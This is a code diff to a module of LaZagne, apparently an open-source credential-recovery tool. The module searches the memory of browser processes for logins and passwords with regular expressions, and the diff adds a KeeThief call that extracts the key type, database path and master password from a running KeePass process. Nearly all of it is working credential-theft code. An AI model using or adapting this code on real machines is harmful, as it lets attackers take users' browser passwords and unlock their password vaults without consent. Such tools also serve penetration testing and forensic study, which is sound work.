@@ -9,7 +9,9 @@ The regex have been taken from the mimikittenz https://github.com/putterpanda/mi
 """
 from lazagne.config.moduleInfo import ModuleInfo
 from lazagne.config.write_output import print_debug
+from lazagne.config.constant import *
 from memorpy import *
+from keethief import KeeThief
 
 # create a symbolic link on Windows
 # mklink /J memorpy ..\..\..\..\external\memorpy\memorpy
@@ -28,6 +30,8 @@ if sys.platform=="win32":
 else:
 	browser_list=["firefox", "iceweasel", "chromium", "chrome"]
 
+keepass_process = 'keepass.exe'
+
 class MemoryDump(ModuleInfo):
 	def __init__(self):
 		options = {'command': '-m', 'action': 'store_true', 'dest': 'memory_dump', 'help': 'retrieve browsers passwords from memory'}
@@ -45,7 +49,24 @@ class MemoryDump(ModuleInfo):
 				print_debug('INFO', 'dumping passwords from %s (pid: %s) ...' % (process.get('name'), str(process.get('pid'))))
 				for _, x in mw.mem_search(password_regex, ftype='groups'):
 					login, password = x[-2:]
-					pwdFound.append({'URL':'Unknown', 'Login': login, 'Password': password})
+					pwdFound.append(
+						{
+							'URL'		:	'Unknown', 
+							'Login'		: 	login,
+							'Password'	: 	password
+						}
+					)
 
+			if keepass_process in process.get('name', '').lower():
+				k = KeeThief()
+				if k.run(process.get('pid')):
+					pwdFound.append(
+						{
+							'Catehory'		:	'KeePass',
+							'KeyType'		:	constant.keepass['KeyType'], 
+							'Login'			: 	constant.keepass['Database'],
+							'Password'		: 	constant.keepass['Password']
+						}
+					)
+				
 		return pwdFound 
-	 
